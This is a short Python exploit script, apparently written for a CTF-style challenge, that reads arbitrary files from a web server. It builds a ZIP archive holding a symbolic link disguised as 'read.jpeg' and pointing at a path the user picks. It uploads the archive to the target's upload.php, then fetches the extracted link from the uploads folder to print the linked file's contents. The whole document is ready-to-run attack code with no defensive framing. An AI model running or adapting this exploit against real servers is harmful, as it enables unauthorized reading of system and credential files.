#!/usr/bin/env python3
import io
import re
import sys
import zipfile
import requests
from datetime import datetime

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <host> <target file path>")
    sys.exit()

host = sys.argv[1]
filepath = sys.argv[2]

zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, "w") as zip_file:
    zipInfo = zipfile.ZipInfo('read.jpeg')
    zipInfo.create_system = 3
    zipInfo.external_attr |= 0xA0000000
    zipInfo.date_time = datetime.now().timetuple()[:6]
    zip_file.writestr(zipInfo, filepath)

files = ('read.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})
resp = requests.post(f'http://{host}/upload.php',
              files={"fileToUpload": ('read.zip', zip_buffer.getbuffer(), {"Content-Type": "application/zip"})},
              data={"submit": "Upload ZIP"}
              )
sys.stdout.buffer.write(resp.content)
print("\n")
# (url, ) = re.findall(r'path:</p><a href="(.*)">\1</a>', resp.text)
(base_name, ) = re.findall(r'File\s(.*?)(?:\.\w+)?\shas been uploaded', resp.text)

resp = requests.get(f'http://{host}/uploads/{base_name}.jpeg')
sys.stdout.buffer.write(resp.content)
